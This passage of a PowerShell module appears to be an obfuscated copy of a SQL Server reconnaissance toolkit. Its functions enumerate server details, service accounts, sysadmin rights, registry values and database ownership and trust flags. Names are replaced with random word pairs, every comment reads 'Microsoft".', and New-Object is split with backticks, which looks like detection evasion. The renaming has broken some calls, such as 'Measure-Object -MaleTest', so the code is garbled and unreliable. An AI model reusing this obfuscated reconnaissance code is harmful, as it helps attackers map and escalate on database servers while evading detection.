                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $ZephyrQuince = ne`w`-ob`je`ct -TypeName System.Data.DataTable
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $CrashNappy = Get-SQLSession -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill |
        Where-Object -FilterScript {
            $_.SessionStatus -eq 'running'
        } |
        Measure-Object -MaleTest |
        Select-Object -Property Lines -ExpandProperty Lines

        # Microsoft".
        $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        if($LovingDry -eq 'Yes')
        {
            # Microsoft".
            $SecondSecond = "
                -- Get machine type
                DECLARE @MachineType  SYSNAME
                EXECUTE master.dbo.xp_regread
                @rootkey		= N'HKEY_LOCAL_MACHINE',
                @key			= N'SYSTEM\CurrentControlSet\Control\ProductOptions',
                @value_name		= N'ProductType',
                @value			= @MachineType output

                -- Get OS version
                DECLARE @ProductName  SYSNAME
                EXECUTE master.dbo.xp_regread
                @rootkey		= N'HKEY_LOCAL_MACHINE',
                @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion',
                @value_name		= N'ProductName',
            @value			= @ProductName output"

            $EightCalm = '  @MachineType as [OsMachineType],
            @ProductName as [OSVersionName],'
        }
        else
        {
            $SecondSecond = ''
            $EightCalm = ''
        }

        # Microsoft".
        $BoringLarge = "  -- Get SQL Server Information

            -- Get SQL Server Service Name and Path
            DECLARE @SQLServerInstance varchar(250)
            DECLARE @SQLServerServiceName varchar(250)
            if @@SERVICENAME = 'MSSQLSERVER'
            BEGIN
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
            set @SQLServerServiceName = 'MSSQLSERVER'
            END
            ELSE
            BEGIN
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
            set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
            END

            -- Get SQL Server Service Account
            DECLARE @ServiceaccountName varchar(250)
            EXECUTE master.dbo.xp_instance_regread
            N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
            N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

            -- Get authentication mode
            DECLARE @AuthenticationMode INT
            EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
            N'Software\Microsoft\MSSQLServer\MSSQLServer',
            N'LoginMode', @AuthenticationMode OUTPUT

            -- Get the forced encryption flag
            BEGIN TRY 
	            DECLARE @ForcedEncryption INT
	            EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
	            N'SOFTWARE\MICROSOFT\Microsoft SQL Server\MSSQLServer\SuperSocketNetLib',
	            N'ForceEncryption', @ForcedEncryption OUTPUT
            END TRY
            BEGIN CATCH	            
            END CATCH

            -- Grab additional information as sysadmin
            $SecondSecond

            -- Return server and version information
            SELECT  '$HauntGusty' as [ComputerName],
            @@servername as [Instance],
            DEFAULT_DOMAIN() as [DomainName],
            SERVERPROPERTY('processid') as ServiceProcessID,
            @SQLServerServiceName as [ServiceName],
            @ServiceAccountName as [ServiceAccount],
            (SELECT CASE @AuthenticationMode
            WHEN 1 THEN 'Windows Authentication'
            WHEN 2 THEN 'Windows and SQL Server Authentication'
            ELSE 'Unknown'
            END) as [AuthenticationMode],
            @ForcedEncryption as ForcedEncryption,
            CASE  SERVERPROPERTY('IsClustered')
            WHEN 0
            THEN 'No'
            ELSE 'Yes'
            END as [Clustered],
            SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
            SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
            serverproperty('Edition') as [SQLServerEdition],
            SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
            SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
            $EightCalm
            RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
            SYSTEM_USER as [Currentlogin],
            '$LovingDry' as [IsSysadmin],
        '$CrashNappy' as [ActiveSessions]"
        # Microsoft".
        $SqueakCellar = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

        # Microsoft".
        $ZephyrQuince = $ZephyrQuince + $SqueakCellar
    }

    End
    {
        # Microsoft".
        $ZephyrQuince
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLServerInfoThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$ItchyJuice = 5,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $ZephyrQuince = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $ZephyrQuince.Columns.Add('ComputerName')
        $null = $ZephyrQuince.Columns.Add('Instance')
        $null = $ZephyrQuince.Columns.Add('DomainName')
        $null = $ZephyrQuince.Columns.Add('ServiceName')
        $null = $ZephyrQuince.Columns.Add('ServiceAccount')
        $null = $ZephyrQuince.Columns.Add('AuthenticationMode')
        $null = $ZephyrQuince.Columns.Add('Clustered')
        $null = $ZephyrQuince.Columns.Add('SQLServerVersionNumber')
        $null = $ZephyrQuince.Columns.Add('SQLServerMajorVersion')
        $null = $ZephyrQuince.Columns.Add('SQLServerEdition')
        $null = $ZephyrQuince.Columns.Add('SQLServerServicePack')
        $null = $ZephyrQuince.Columns.Add('OSArchitecture')
        $null = $ZephyrQuince.Columns.Add('OsMachineType')
        $null = $ZephyrQuince.Columns.Add('OSVersionName')
        $null = $ZephyrQuince.Columns.Add('OsVersionNumber')
        $null = $ZephyrQuince.Columns.Add('Currentlogin')
        $null = $ZephyrQuince.Columns.Add('IsSysadmin')
        $null = $ZephyrQuince.Columns.Add('ActiveSessions')

        # Microsoft".
        $TinyHealth = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($Instance)
        {
            $BeefSpy = ne`w`-ob`je`ct -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Microsoft".
        $TinyHealth = $TinyHealth + $BeefSpy
    }

    Process
    {
        # Microsoft".
        $TinyHealth = $TinyHealth + $_
    }

    End
    {
        # Microsoft".
        $SecondElite = {
            $Instance = $_.Instance

            # Microsoft".
            $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

            # Microsoft".
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Microsoft".
            $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
                $_.Status -eq 'Accessible'
            }
            if($HoneyHusky)
            {
                if( -not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
            }
            else
            {
                if( -not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                return
            }

            # Microsoft".
            $CrashNappy = Get-SQLSession -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill |
            Where-Object -FilterScript {
                $_.SessionStatus -eq 'running'
            } |
            Measure-Object -MaleTest |
            Select-Object -Property Lines -ExpandProperty Lines

            # Microsoft".
            $LovingDry = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -RaggedQuill | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

            if($LovingDry -eq 'Yes')
            {
                # Microsoft".
                $SecondSecond = "
                    -- Get machine type
                    DECLARE @MachineType  SYSNAME
                    EXECUTE master.dbo.xp_regread
                    @rootkey		= N'HKEY_LOCAL_MACHINE',
                    @key			= N'SYSTEM\CurrentControlSet\Control\ProductOptions',
                    @value_name		= N'ProductType',
                    @value			= @MachineType output

                    -- Get OS version
                    DECLARE @ProductName  SYSNAME
                    EXECUTE master.dbo.xp_regread
                    @rootkey		= N'HKEY_LOCAL_MACHINE',
                    @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion',
                    @value_name		= N'ProductName',
                @value			= @ProductName output"

                $EightCalm = '  @MachineType as [OsMachineType],
                @ProductName as [OSVersionName],'
            }
            else
            {
                $SecondSecond = ''
                $EightCalm = ''
            }

            # Microsoft".
            $BoringLarge = "  -- Get SQL Server Information

                -- Get SQL Server Service Name and Path
                DECLARE @SQLServerInstance varchar(250)
                DECLARE @SQLServerServiceName varchar(250)
                if @@SERVICENAME = 'MSSQLSERVER'
                BEGIN
                set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
                set @SQLServerServiceName = 'MSSQLSERVER'
                END
                ELSE
                BEGIN
                set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
                set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
                END

                -- Get SQL Server Service Account
                DECLARE @ServiceaccountName varchar(250)
                EXECUTE master.dbo.xp_instance_regread
                N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
                N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

                -- Get authentication mode
                DECLARE @AuthenticationMode INT
                EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
                N'Software\Microsoft\MSSQLServer\MSSQLServer',
                N'LoginMode', @AuthenticationMode OUTPUT

                -- Grab additional information as sysadmin
                $SecondSecond

                -- Return server and version information
                SELECT  '$HauntGusty' as [ComputerName],
                @@servername as [Instance],
                DEFAULT_DOMAIN() as [DomainName],
                @SQLServerServiceName as [ServiceName],
                @ServiceAccountName as [ServiceAccount],
                (SELECT CASE @AuthenticationMode
                WHEN 1 THEN 'Windows Authentication'
                WHEN 2 THEN 'Windows and SQL Server Authentication'
                ELSE 'Unknown'
                END) as [AuthenticationMode],
                CASE  SERVERPROPERTY('IsClustered')
                WHEN 0
                THEN 'No'
                ELSE 'Yes'
                END as [Clustered],
                SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
                SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
                serverproperty('Edition') as [SQLServerEdition],
                SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
                SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
                $EightCalm
                RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
                SYSTEM_USER as [Currentlogin],
                '$LovingDry' as [IsSysadmin],
            '$CrashNappy' as [ActiveSessions]"
            # Microsoft".
            $SqueakCellar = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            # Microsoft".
            $SqueakCellar |
            ForEach-Object -Process {
                # Microsoft".
                $null = $ZephyrQuince.Rows.Add(
                    $_.ComputerName,
                    $_.Instance,
                    $_.DomainName,
                    $_.ServiceName,
                    $_.ServiceAccount,
                    $_.AuthenticationMode,
                    $_.Clustered,
                    $_.SQLServerVersionNumber,
                    $_.SQLServerMajorVersion,
                    $_.SQLServerEdition,
                    $_.SQLServerServicePack,
                    $_.OSArchitecture,
                    $_.OsMachineType,
                    $_.OSVersionName,
                    $_.OsVersionNumber,
                    $_.Currentlogin,
                    $_.IsSysadmin,
                    $_.ActiveSessions
                )
            }
        }

        # Microsoft".
        $TinyHealth | Invoke-Parallel -PlacidSleet $SecondElite -MateEasy -RhymeCoach -RouteWink $ItchyJuice -ShirtStory 2 -MassHope -ErrorAction SilentlyContinue

        return $ZephyrQuince
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDatabase
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases the current user has access to.')]
        [switch]$TownItch,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases owned by a sysadmin.')]
        [switch]$BedSmoke,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $JugglePush = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $JugglePush.Columns.Add('ComputerName')
        $null = $JugglePush.Columns.Add('Instance')
        $null = $JugglePush.Columns.Add('DatabaseId')
        $null = $JugglePush.Columns.Add('DatabaseName')
        $null = $JugglePush.Columns.Add('DatabaseOwner')
        $null = $JugglePush.Columns.Add('OwnerIsSysadmin')
        $null = $JugglePush.Columns.Add('is_trustworthy_on')
        $null = $JugglePush.Columns.Add('is_db_chaining_on')
        $null = $JugglePush.Columns.Add('is_broker_enabled')
        $null = $JugglePush.Columns.Add('is_encrypted')
        $null = $JugglePush.Columns.Add('is_read_only')
        $null = $JugglePush.Columns.Add('create_date')
        $null = $JugglePush.Columns.Add('recovery_model_desc')
        $null = $JugglePush.Columns.Add('FileName')
        $null = $JugglePush.Columns.Add('DbSizeMb')
        $null = $JugglePush.Columns.Add('has_dbaccess')

        # Microsoft".
        if($AjarInnate)
        {
            $WallCharge = " and a.name like '$AjarInnate'"
        }
        else
        {
            $WallCharge = ''
        }

        # Microsoft".
        if($EggsBead)
        {
            $BabiesBloody = " and a.name not in ('master','tempdb','msdb','model')"
        }
        else
        {
            $BabiesBloody = ''
        }

        # Microsoft".
        if($TownItch)
        {
            $CloseUseful = ' and HAS_DBACCESS(a.name)=1'
        }
        else
        {
            $CloseUseful = ''
        }

        # Microsoft".
        if($BedSmoke)
        {
            $HarshLovely = " and IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid))=1"
        }
        else
        {
            $HarshLovely = ''
        }
    }

    Process
    {
        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        $FirstStage = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($FirstStage)
        {
            $PlantsPlants = $FirstStage.Split('.')[0]
        }

        # Microsoft".
        $DropBounce = "  SELECT  '$HauntGusty' as [ComputerName],
            '$Instance' as [Instance],
            a.database_id as [DatabaseId],
            a.name as [DatabaseName],
            SUSER_SNAME(a.owner_sid) as [DatabaseOwner],
            IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid)) as [OwnerIsSysadmin],
            a.is_trustworthy_on,
        a.is_db_chaining_on,"

        # Microsoft".
        if([int]$PlantsPlants -ge 10)
        {
            $ShoeBlood = '
                a.is_broker_enabled,
                a.is_encrypted,
            a.is_read_only,'
        }

        # Microsoft".
        $WoodSteady = '
            a.create_date,
            a.recovery_model_desc,
            b.filename as [FileName],
            (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2))
            from sys.master_files where name like a.name) as [DbSizeMb],
            HAS_DBACCESS(a.name) as [has_dbaccess]
            FROM [sys].[databases] a
        INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid WHERE 1=1'

        # Microsoft".
        $ExtendMatch = "
            $WallCharge
            $BabiesBloody
            $CloseUseful
            $HarshLovely
        ORDER BY a.database_id"

        $BoringLarge = "$DropBounce $ShoeBlood $WoodSteady $ExtendMatch"

        # Microsoft".
        $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

        # Microsoft".
        $TradeSpicy |
        ForEach-Object -Process {
            # Microsoft".
            if([int]$PlantsPlants -ge 10)
            {
                $SonRing = $_.is_broker_enabled
                $UnableTable = $_.is_encrypted
                $DrownWool = $_.is_read_only
            }
            else
            {
                $SonRing = 'NA'
                $UnableTable = 'NA'
                $DrownWool = 'NA'
            }

            $null = $JugglePush.Rows.Add(
                $_.ComputerName,
                $_.Instance,
                $_.DatabaseId,
                $_.DatabaseName,
                $_.DatabaseOwner,
                $_.OwnerIsSysadmin,
                $_.is_trustworthy_on,
                $_.is_db_chaining_on,
                $SonRing,
                $UnableTable,
                $DrownWool,
                $_.create_date,
                $_.recovery_model_desc,
                $_.FileName,
                $_.DbSizeMb,
                $_.has_dbaccess
            )
        }

    }

    End
    {
        # Microsoft".
        $JugglePush
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLDatabaseThreaded
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases the current user has access to.')]
        [switch]$TownItch,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases owned by a sysadmin.')]
        [switch]$BedSmoke,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$ItchyJuice = 2,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        # Microsoft".
        $TradeSpicy = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $JugglePush = ne`w`-ob`je`ct -TypeName System.Data.DataTable
        $null = $JugglePush.Columns.Add('ComputerName')
        $null = $JugglePush.Columns.Add('Instance')
        $null = $JugglePush.Columns.Add('DatabaseId')
        $null = $JugglePush.Columns.Add('DatabaseName')
        $null = $JugglePush.Columns.Add('DatabaseOwner')
        $null = $JugglePush.Columns.Add('OwnerIsSysadmin')
        $null = $JugglePush.Columns.Add('is_trustworthy_on')
        $null = $JugglePush.Columns.Add('is_db_chaining_on')
        $null = $JugglePush.Columns.Add('is_broker_enabled')
        $null = $JugglePush.Columns.Add('is_encrypted')
        $null = $JugglePush.Columns.Add('is_read_only')
        $null = $JugglePush.Columns.Add('create_date')
        $null = $JugglePush.Columns.Add('recovery_model_desc')
        $null = $JugglePush.Columns.Add('FileName')
        $null = $JugglePush.Columns.Add('DbSizeMb')
        $null = $JugglePush.Columns.Add('has_dbaccess')

        # Microsoft".
        if($AjarInnate)
        {
            $WallCharge = " and a.name like '$AjarInnate'"
        }
        else
        {
            $WallCharge = ''
        }

        # Microsoft".
        if($EggsBead)
        {
            $BabiesBloody = " and a.name not in ('master','tempdb','msdb','model')"
        }
        else
        {
            $BabiesBloody = ''
        }

        # Microsoft".
        if($TownItch)
        {
            $CloseUseful = ' and HAS_DBACCESS(a.name)=1'
        }
        else
        {
            $CloseUseful = ''
        }

        # Microsoft".
        if($BedSmoke)
        {
            $HarshLovely = " and IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid))=1"
        }
        else
        {
            $HarshLovely = ''
        }

        # Microsoft".
        $TinyHealth = ne`w`-ob`je`ct -TypeName System.Data.DataTable


        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        if($Instance)
        {
            $BeefSpy = ne`w`-ob`je`ct -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Microsoft".
        $TinyHealth = $TinyHealth + $BeefSpy
    }

    Process
    {
        # Microsoft".
        $TinyHealth = $TinyHealth + $_
    }

    End
    {
        # Microsoft".
        $SecondElite = {
            # Microsoft".
            $Instance = $_.Instance

            # Microsoft".
            $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

            # Microsoft".
            $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
                $_.Status -eq 'Accessible'
            }
            if($HoneyHusky)
            {
                if( -not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
            }
            else
            {
                if( -not $RaggedQuill)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                return
            }

            # Microsoft".
            $FirstStage = Get-SQLServerInfo -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
            if($FirstStage)
            {
                $PlantsPlants = $FirstStage.Split('.')[0]
            }

            # Microsoft".
            $DropBounce = "  SELECT  '$HauntGusty' as [ComputerName],
                '$Instance' as [Instance],
                a.database_id as [DatabaseId],
                a.name as [DatabaseName],
                SUSER_SNAME(a.owner_sid) as [DatabaseOwner],
                IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid)) as [OwnerIsSysadmin],
                a.is_trustworthy_on,
            a.is_db_chaining_on,"

            # Microsoft".
            if([int]$PlantsPlants -ge 10)
            {
                $ShoeBlood = '
                    a.is_broker_enabled,
                    a.is_encrypted,
                a.is_read_only,'
            }

            # Microsoft".
            $WoodSteady = '
                a.create_date,
                a.recovery_model_desc,
                b.filename as [FileName],
                (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2))
                from sys.master_files where name like a.name) as [DbSizeMb],
                HAS_DBACCESS(a.name) as [has_dbaccess]
                FROM [sys].[databases] a
            INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid WHERE 1=1'

            # Microsoft".
            $ExtendMatch = "
                $WallCharge
                $BabiesBloody
                $CloseUseful
                $HarshLovely
            ORDER BY a.database_id"

            $BoringLarge = "$DropBounce $ShoeBlood $WoodSteady $ExtendMatch"

            # Microsoft".
            $TradeSpicy = Get-SQLQuery -Instance $Instance -BoringLarge $BoringLarge -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill

            # Microsoft".
            $TradeSpicy |
            ForEach-Object -Process {
                # Microsoft".
                if([int]$PlantsPlants -ge 10)
                {
                    $SonRing = $_.is_broker_enabled
                    $UnableTable = $_.is_encrypted
                    $DrownWool = $_.is_read_only
                }
                else
                {
                    $SonRing = 'NA'
                    $UnableTable = 'NA'
                    $DrownWool = 'NA'
                }

                $null = $JugglePush.Rows.Add(
                    $_.ComputerName,
                    $_.Instance,
                    $_.DatabaseId,
                    $_.DatabaseName,
                    $_.DatabaseOwner,
                    $_.OwnerIsSysadmin,
                    $_.is_trustworthy_on,
                    $_.is_db_chaining_on,
                    $SonRing,
                    $UnableTable,
                    $DrownWool,
                    $_.create_date,
                    $_.recovery_model_desc,
                    $_.FileName,
                    $_.DbSizeMb,
                    $_.has_dbaccess
                )
            }
        }

        # Microsoft".
        $TinyHealth | Invoke-Parallel -PlacidSleet $SecondElite -MateEasy -RhymeCoach -RouteWink $ItchyJuice -ShirtStory 2 -MassHope -ErrorAction SilentlyContinue

        return $JugglePush
    }
}


# Microsoft".
# Microsoft".
# Microsoft".
# Microsoft".
Function  Get-SQLTable
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$AnimalWeary,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$EasyAlert,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$AjarInnate,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Table name.')]
        [string]$MuscleTeam,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$EggsBead,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$RaggedQuill
    )

    Begin
    {
        $UltraRate = ne`w`-ob`je`ct -TypeName System.Data.DataTable

        # Microsoft".
        if($MuscleTeam)
        {
            $CloseGlow = " where table_name like '%$MuscleTeam%'"
        }
        else
        {
            $CloseGlow = ''
        }
    }

    Process
    {
        # Microsoft".

        # Microsoft".
        $HauntGusty = Get-ComputerNameFromInstance -Instance $Instance

        # Microsoft".
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Microsoft".
        $HoneyHusky = Get-SQLConnectionTest -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -RaggedQuill | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($HoneyHusky)
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing tables from databases below:"
            }
        }
        else
        {
            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Microsoft".
        if($EggsBead)
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -EggsBead -RaggedQuill
        }
        else
        {
            # Microsoft".
            $JugglePush = Get-SQLDatabase -Instance $Instance -AnimalWeary $AnimalWeary -EasyAlert $EasyAlert -Credential $Credential -AjarInnate $AjarInnate -TownItch -RaggedQuill
        }

        # Microsoft".
        $JugglePush |
        ForEach-Object -Process {
            # Microsoft".
            $FileSheep = $_.DatabaseName

            if( -not $RaggedQuill)
            {
                Write-Verbose -Message "$Instance : - $FileSheep"
            }

            # Microsoft".
